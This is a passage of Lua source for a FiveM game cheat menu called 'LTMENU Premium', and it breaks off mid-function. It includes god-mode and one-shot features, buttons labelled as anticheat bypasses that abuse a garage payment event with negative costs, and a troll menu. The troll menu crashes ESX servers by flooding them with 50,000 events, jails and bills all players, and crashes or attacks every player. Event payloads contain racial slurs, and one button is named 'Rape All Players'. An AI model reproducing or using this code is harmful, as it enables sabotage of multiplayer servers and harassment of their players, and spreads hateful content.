			SetPedCanRagdoll(GetPlayerPed(-1), true)
			ClearPedLastWeaponDamage(GetPlayerPed(-1))
			SetEntityProofs(GetPlayerPed(-1), false, false, false, false, false, false, false, false)
			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), true)
			SetEntityCanBeDamaged(GetPlayerPed(-1), true)
		end

		if discordPresence then
                    SetDiscordAppId(628637344098025482)
            
                    SetDiscordRichPresenceAsset('LTMENU Premium')
                    
					SetRichPresence('LTMENU')
			
                    SetDiscordRichPresenceAssetText('LTMENU Premium | Lol Fuck you')
                
                    SetDiscordRichPresenceAssetSmall('LTMENU Premium')
            
                    SetDiscordRichPresenceAssetSmallText('LTMENU ON YOUTUBE')
            
                end
		
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end
			
			if NOXJDSS then
                local cI = {
                    [453432689] = 1.0,
                    [3219281620] = 1.0,
                    [1593441988] = 1.0,
                    [584646201] = 1.0,
                    [2578377531] = 1.0,
                    [324215364] = 1.0,
                    [736523883] = 1.0,
                    [2024373456] = 1.0,
                    [4024951519] = 1.0,
                    [3220176749] = 1.0,
                    [961495388] = 1.0,
                    [2210333304] = 1.0,
                    [4208062921] = 1.0,
                    [2937143193] = 1.0,
                    [2634544996] = 1.0,
                    [2144741730] = 1.0,
                    [3686625920] = 1.0,
                    [487013001] = 1.0,
                    [1432025498] = 1.0,
                    [2017895192] = 1.0,
                    [3800352039] = 1.0,
                    [2640438543] = 1.0,
                    [911657153] = 1.0,
                    [100416529] = 1.0,
                    [205991906] = 1.0,
                    [177293209] = 1.0,
                    [856002082] = 1.0,
                    [2726580491] = 1.0,
                    [1305664598] = 1.0,
                    [2982836145] = 1.0,
                    [1752584910] = 1.0,
                    [1119849093] = 1.0,
                    [3218215474] = 1.0,
                    [1627465347] = 1.0,
                    [3231910285] = 1.0,
                    [-1768145561] = 1.0,
                    [3523564046] = 1.0,
                    [2132975508] = 1.0,
                    [-2066285827] = 1.0,
                    [137902532] = 1.0,
                    [2828843422] = 1.0,
                    [984333226] = 1.0,
                    [3342088282] = 1.0,
                    [1785463520] = 1.0,
                    [1672152130] = 0,
                    [1198879012] = 1.0,
                    [171789620] = 1.0,
                    [3696079510] = 1.0,
                    [1834241177] = 1.0,
                    [3675956304] = 1.0,
                    [3249783761] = 1.0,
                    [-879347409] = 1.0,
                    [4019527611] = 1.0,
                    [1649403952] = 1.0,
                    [317205821] = 1.0,
                    [125959754] = 1.0,
                    [3173288789] = 1.0
                }
                if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
                    local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
                    _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
                    if cI[cJ] and cI[cJ] ~= 0 then
                        tv = 0
                        if GetFollowPedCamViewMode() ~= 4 then
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                tv = tv + 0.0
                            until tv >= cI[cJ]
                        else
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                if cI[cJ] > 0.0 then
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                else
                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                    tv = tv + 0.0
                                end
                            until tv >= cI[cJ]
                        end
                    end
                end
            end

            if Oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntity(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end
    end)
Citizen.CreateThread(
    function()

        local currentTint = 1
        local selectedTint = 1

        LTPREMIUM.CreateMenu("MainMenu", "LTPREMIUM")
        LTPREMIUM.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
		LTPREMIUM.CreateSubMenu("PedMenu", "SelfMenu", "Ped Menu")
        LTPREMIUM.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        LTPREMIUM.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        LTPREMIUM.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        LTPREMIUM.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
		LTPREMIUM.CreateSubMenu('LulxDJ', 'MaliciousMenu', 'ESP Menu')
        LTPREMIUM.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        LTPREMIUM.CreateSubMenu("PremiumMenu", "MainMenu", "Premium Options")
        LTPREMIUM.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        LTPREMIUM.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        LTPREMIUM.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        LTPREMIUM.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
        LTPREMIUM.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        LTPREMIUM.CreateSubMenu("CreditsMenu", "MainMenu", "Credits Menu")
		LTPREMIUM.CreateSubMenu("Hedit", "VehMenu", "Handling")
        LTPREMIUM.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
        LTPREMIUM.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		LTPREMIUM.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
        LTPREMIUM.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Vehicle types')
        LTPREMIUM.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Vehicle Options')
        LTPREMIUM.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        LTPREMIUM.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        LTPREMIUM.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
		LTPREMIUM.CreateSubMenu("AI", "MainMenu", "AI Menu")
        LTPREMIUM.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options") 
        LTPREMIUM.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        LTPREMIUM.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        LTPREMIUM.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        LTPREMIUM.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        LTPREMIUM.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        LTPREMIUM.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        LTPREMIUM.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        LTPREMIUM.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        LTPREMIUM.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        LTPREMIUM.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        LTPREMIUM.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        LTPREMIUM.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
		LTPREMIUM.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
        LTPREMIUM.CreateSubMenu("performance", "LSC", "Performance Tuning")
        LTPREMIUM.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        LTPREMIUM.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        LTPREMIUM.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
		LTPREMIUM.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
        LTPREMIUM.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
		LTPREMIUM.CreateSubMenu("Credits", "SettingsMenu", "Credits")
for i, dA in pairs(bd) do 
                LTPREMIUM.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
                LTPREMIUM.CreateSubMenu("primary", dA.id, "Primary Paint") 
                LTPREMIUM.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
                LTPREMIUM.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
                LTPREMIUM.CreateSubMenu("classic1", "primary", "Classic Paint") 
                LTPREMIUM.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
                LTPREMIUM.CreateSubMenu("matte1", "primary", "Matte Paint") 
                LTPREMIUM.CreateSubMenu("metal1", "primary", "Metal Paint") 
                LTPREMIUM.CreateSubMenu("classic2", "secondary", "Classic Paint") 
                LTPREMIUM.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
                LTPREMIUM.CreateSubMenu("matte2", "secondary", "Matte Paint") 
                LTPREMIUM.CreateSubMenu("metal2", "secondary", "Metal Paint") 
                LTPREMIUM.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
                LTPREMIUM.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
                LTPREMIUM.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
                LTPREMIUM.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
            end 
        end
        for i, dA in pairs(be) do 
            LTPREMIUM.CreateSubMenu(dA.id, "performance", dA.name) 
        end
    
        local SelectedPlayer
    
            while Enabled do
    
                local ped = PlayerPedId() 
                local veh = GetVehiclePedIsUsing(ped) 
                SetVehicleModKit(veh, 0) 
                for i, dA in pairs(bd) do
                    if LTPREMIUM.IsMenuOpened("tunings") then
                        if b8 then
                            if ba == "neon" then 
                                local r, g, b = table.unpack(b9) 
                                SetVehicleNeonLightsColour(veh, r, g, b) 
                                SetVehicleNeonLightEnabled(veh, 0, bc) 
                                SetVehicleNeonLightEnabled(veh, 1, bc) 
                                SetVehicleNeonLightEnabled(veh, 2, bc) 
                                SetVehicleNeonLightEnabled(veh, 3, bc) 
                                b8 = false 
                                ba = -1 
                                b9 = -1 
                            elseif ba == "paint" then 
                                local dB, dC, dD, dA = table.unpack(b9) 
                                SetVehicleColours(veh, dB, dC) 
                                SetVehicleExtraColours(veh, dD, dA) 
                                b8 = false
                                ba = -1; 
                                b9 = -1
                            else 
                                if bc == "rm" then 
                                    RemoveVehicleMod(veh, ba) 
                                    b8 = false 
                                    ba = -1 
                                    b9 = -1
                                else 
                                    SetVehicleMod(veh, ba, b9, false) 
                                    b8 = false 
                                    ba = -1 
                                    b9 = -1 
                                end 
                            end 
                        end 
                    end
    
                    if LTPREMIUM.IsMenuOpened(dA.id) then
                        if dA.id == "wheeltypes" then
                            if LTPREMIUM.Button("Sport Wheels") then 
                                SetVehicleWheelType(veh, 0) 
                            elseif LTPREMIUM.Button("Muscle Wheels") then 
                                SetVehicleWheelType(veh, 1) 
                            elseif LTPREMIUM.Button("Lowrider Wheels") then 
                                SetVehicleWheelType(veh, 2) 
                            elseif LTPREMIUM.Button("SUV Wheels") then 
                                SetVehicleWheelType(veh, 3) 
                            elseif LTPREMIUM.Button("Offroad Wheels") then 
                                SetVehicleWheelType(veh, 4) 
                            elseif LTPREMIUM.Button("Tuner Wheels") then 
                                SetVehicleWheelType(veh, 5) 
                            elseif LTPREMIUM.Button("High End Wheels") then 
                                SetVehicleWheelType(veh, 7) 
                            end
                                
                            LTPREMIUM.Display() 
                        elseif dA.id == "extra" then 
                            local dF = checkValidVehicleExtras() 
                            for i, dA in pairs(dF) do
                                if IsVehicleExtraTurnedOn(veh, i) then 
                                    pricestring = "Installed"
                                else 
                                    pricestring = "Not Installed"
                                end
                                if LTPREMIUM.Button(dA.menuName, pricestring) then 
                                    SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) 
                                end 
                            end 
    
                            LTPREMIUM.Display() 
                        elseif dA.id == "headlight" then
                            if LTPREMIUM.Button("None") then 
                                SetVehicleHeadlightsColour(veh, -1) 
                            end
                            for dK, dA in pairs(bo) do 
                                tp = GetVehicleHeadlightsColour(veh) 
                                if tp == dA.id and not bg then 
                                    pricetext = "Installed"
                                else 
                                    if bg and tp == dA.id then 
                                        pricetext = "Previewing"
                                    else pricetext = "Not Installed"
                                    end 
                                end
                                head = GetVehicleHeadlightsColour(veh) 
                                if LTPREMIUM.Button(dA.name, pricetext) then
                                    if not bg then 
                                        bi = "headlight"
                                        bk = false
                                        oldhead = GetVehicleHeadlightsColour(veh) 
                                        bh = table.pack(oldhead) 
                                        SetVehicleHeadlightsColour(veh, dA.id) 
                                        bg = true 
                                    elseif bg and head == dA.id then 
                                        ToggleVehicleMod(veh, 22, true) 
                                        SetVehicleHeadlightsColour(veh, dA.id) 
                                        bg = false; bi = -1; bh = -1 
                                    elseif bg and head ~= dA.id then 
                                        SetVehicleHeadlightsColour(veh, dA.id) bg = true 
                                    end 
                                end 
                            end
    
                                LTPREMIUM.Display() 
                        elseif dA.id == "neon" then
                            if LTPREMIUM.Button("None") then 
                                SetVehicleNeonLightsColour(veh, 255, 255, 255) 
                                SetVehicleNeonLightEnabled(veh, 0, false) 
                                SetVehicleNeonLightEnabled(veh, 1, false) 
                                SetVehicleNeonLightEnabled(veh, 2, false) 
                                SetVehicleNeonLightEnabled(veh, 3, false) 
                            end
                            for i, dA in pairs(colors) do 
                                colorr, colorg, colorb = table.unpack(dA) 
                                r, g, b = GetVehicleNeonLightsColour(veh) 
                                if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then 
                                    pricestring = "Installed"
                                else 
                                    if b8 and colorr == r and colorg == g and colorb == b then 
                                        pricestring = "Previewing"
                                    else 
                                        pricestring = "Not Installed"
                                    end 
                                end
                                if LTPREMIUM.Button(i, pricestring) then
                                    if not b8 then 
                                        ba = "neon"
                                        bc = IsVehicleNeonLightEnabled(veh, 1) 
                                        oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) 
                                        b9 = table.pack(oldr, oldg, oldb) 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true) 
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = true 
                                    elseif b8 and colorr == r and colorg == g and colorb == b then 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true)
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = false 
                                        ba = -1 
                                        b9 = -1 
                                    elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then 
                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
                                        SetVehicleNeonLightEnabled(veh, 0, true) 
                                        SetVehicleNeonLightEnabled(veh, 1, true) 
                                        SetVehicleNeonLightEnabled(veh, 2, true)
                                        SetVehicleNeonLightEnabled(veh, 3, true) 
                                        b8 = true 
                                    end 
                                end 
                            end
        
                            LTPREMIUM.Display() 
                        elseif dA.id == "paint" then
                            if LTPREMIUM.MenuButton("~r~→  ~s~Primary Paint", "primary") then 
                            elseif LTPREMIUM.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then 
                            elseif LTPREMIUM.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then 
                            end 
                            LTPREMIUM.Display()
                        else 
                            local as = checkValidVehicleMods(dA.id) 
                            for dG, dH in pairs(as) do
                                if dH.menuName == "Stock" then 
                                    price = 0 
                                end
                                if dA.name == "Horns" then
                                    for dI, dJ in pairs(horns) do
                                        if dJ ==dG - 1 then 
                                            dH.menuName = dI 
                                        end 
                                    end 
                                end
                                if dH.menuName == "NULL" then 
                                    dH.menuname = "unknown"
                                end
                                if LTPREMIUM.Button(dH.menuName, price) then
                                    if not b8 then 
                                        ba = dA.id
                                        b9 = GetVehicleMod(veh, dA.id) 
                                        b8 = true
                                        if dH.data.realIndex == -1 then 
                                            bc = "rm"
                                            RemoveVehicleMod(veh, dH.data.modid) 
                                            b8 = false 
                                            ba = -1 
                                            b9 = -1 
                                            bc = false
                                        else 
                                            bc = false 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                        end 
                                    elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then 
                                        b8 = false 
                                        ba = -1 
                                        b9 = -1 
                                        bc = false
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(veh, dH.data.modid)
                                        else 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                        end 
                                    elseif b8 and GetVehicleMod(veh, dA.id)  ~= dH.data.realIndex then
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(veh, dH.data.modid) 
                                            b8 = false 
                                            ba = -1 
                                            b9 = -1 
                                            bc = false
                                        else 
                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
                                            b8 = true 
                                        end 
                                    end 
                                end 
                            end 
                                        LTPREMIUM.Display() 
                        end 
                    end 
                end
    
            for i, dA in pairs(be) do
                if LTPREMIUM.IsMenuOpened(dA.id) then
                if GetVehicleMod(veh, dA.id) == 0 then pricestock = "Not Installed"
                price1 = "Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 1 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 2 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(veh, dA.id) == 3 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Installed"
                elseif GetVehicleMod(veh, dA.id) == -1 then pricestock = "Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
            end
            if LTPREMIUM.Button("Stock "..dA.name, pricestock) then 
                SetVehicleMod(veh, dA.id, -1) 
            elseif LTPREMIUM.Button(dA.name.." Upgrade 1", price1) then 
                SetVehicleMod(veh, dA.id, 0) 
            elseif LTPREMIUM.Button(dA.name.." Upgrade 2", price2) then 
                SetVehicleMod(veh, dA.id, 1) 
            elseif LTPREMIUM.Button(dA.name.." Upgrade 3", price3) then 
                SetVehicleMod(veh, dA.id, 2) 
            elseif dA.id ~= 13 and dA.id ~= 12 and LTPREMIUM.Button(dA.name.." Upgrade 4", price4) then 
                SetVehicleMod(veh, dA.id, 3) end; LTPREMIUM.Display() 
            end 
        end

            if LTPREMIUM.IsMenuOpened("MainMenu") then
                drawNotification("~h~~r~LTMENU ~s~Premium")
                drawNotification("~h~~s~LTMENU ON YOUTUBE")
                if LTPREMIUM.MenuButton("~r~→  ~s~[🚶‍♂️] Sеlf Mеnu", "SelfMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[✈️] Tеlеpоrt Mеnu", "TeleportMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[🤖] АI", "AI") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[👥] Оnlinе Plаyеrs", "OnlinePlayersMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[🔫 ] Wеаpоn Mеnu", "WeaponMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[💂] Сrеаtоrs", "CreditsMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[🚕  ] Vеhiсlе Mеnu", "VehMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[⚡] Еxtrеme Mеnu", "MaliciousMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[👹] Fuсk Sеrvеr", "TrollMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[⭐] Prеmium Оptions", "PremiumMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[🛠️] ЕSХ Оptiоns", "ESXMenu") then
                elseif LTPREMIUM.MenuButton("~r~→  ~s~[⚙️] Sеttings", "SettingsMenu") then
                elseif LTPREMIUM.Button("~r~→  ~s~~r~[❌] Clоse The Menu") then
                    Enabled = false
                end

                LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("PremiumMenu") then
                if LTPREMIUM.Button("[⭐] FiveGuard Bypass NOT FULL BYPASS") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif LTPREMIUM.Button("[⭐] Vanilla Bypass NOT FULL BYPASS") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif LTPREMIUM.Button("[⭐] Api AC NOT FULL BYPASS") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif LTPREMIUM.Button("[⭐] Screenshot Bypass") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif LTPREMIUM.Button("[⭐] Community Service ALL PLAYERS") then
                    TriggerServerEvent("communityservice:sendToCommunityService", -1, 35435353)
                elseif LTPREMIUM.Button("[⭐]Jail All Players") then
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", -1, 34343434, LTPREMIUMRELEASE)
                    end   

                LTPREMIUM.Display()
			                elseif LTPREMIUM.IsMenuOpened("SettingsMenu") then
                if LTPREMIUM.ComboBox("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = selectedIndex
                    for i = 1, #allMenus do
                        LTPREMIUM.SetMenuX(allMenus[i], menuX[currentMenuX])
                    end
                    end) 
                    then
                elseif LTPREMIUM.ComboBox("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = selectedIndex
                    for i = 1, #allMenus do
                        LTPREMIUM.SetMenuY(allMenus[i], menuY[currentMenuY])
                    end
                    end)
                    then
                    elseif LTPREMIUM.CheckBox("~u~Discord~s~ Display", discordPresence, function(enabled) discordPresence = enabled end) then
					elseif LTPREMIUM.MenuButton("~r~→  ~s~Information", "InfoMenu") then
                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Credits", "Credits") then
                    end
    
                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("InfoMenu") then
                    if LTPREMIUM.Button("LTPREMIUM") then
					elseif LTPREMIUM.Button("https://discord.gg/8nSCR6u") then
                    end
    
                    LTPREMIUM.Display()
                elseif LTPREMIUM.IsMenuOpened("CreditsMenu") then
				if     LTPREMIUM.Button("~h~Here <3") then
				elseif LTPREMIUM.Button("∑  ~r~~h~tedakaxd~s~ - ~r~DEV") then
				drawNotification('~h~Contact him for More releases.')
				drawNotification('~h~Also contact him if you want to purchase any menu.')
				elseif LTPREMIUM.Button("∑  ~r~~h~Lezy~s~ - ~r~Semi-Helper") then
				end
					
					LTPREMIUM.Display()
            elseif LTPREMIUM.IsMenuOpened("TrollMenu") then
                if LTPREMIUM.Button("ESX Server Crasher") then
                    for i = 1, 50000 do TriggerServerEvent("esx_skin:responseSaveSkin", {niggers = "gay"}) TriggerServerEvent("esx_skin:responseSaveSkin", "niggers eat shit") end
                elseif  LTPREMIUM.CheckBox(
                    "Send everyone to jail",
                    banallusers,
                    function(enabled)
                    banallusers = enabled
                    end)
                then
				elseif LTPREMIUM.Button("Spawn moutain Lion On Everyone") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
				elseif LTPREMIUM.Button("SWAT W/ Railgun On Everyone") then
                    local swat = "s_m_y_swat_01"
					local bR = "weapon_railgun"
                    for i = 0, 128 do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(-1000)
                            end
                        end
                    end
                elseif LTPREMIUM.Button("Nuke Server") then
                    nukeserver()
				elseif LTPREMIUM.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif LTPREMIUM.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
                    local amount = KeyboardInput("Enter Amount", "", 100000000)
                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif LTPREMIUM.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "LTMENU Premium, LTMENU ON YOUTUBE", "99999999")
                end
				elseif LTPREMIUM.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif LTPREMIUM.Button("Rape All Players") then
                    RapeAllFunc()
                elseif LTPREMIUM.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
                elseif LTPREMIUM.Button('Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(-1000)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(-1000)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
				elseif LTPREMIUM.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif LTPREMIUM.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif LTPREMIUM.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif LTPREMIUM.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif LTPREMIUM.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif LTPREMIUM.Button("Fake Message") then
                    local da=KeyboardInput("Enter player name","",100)
                    if da then
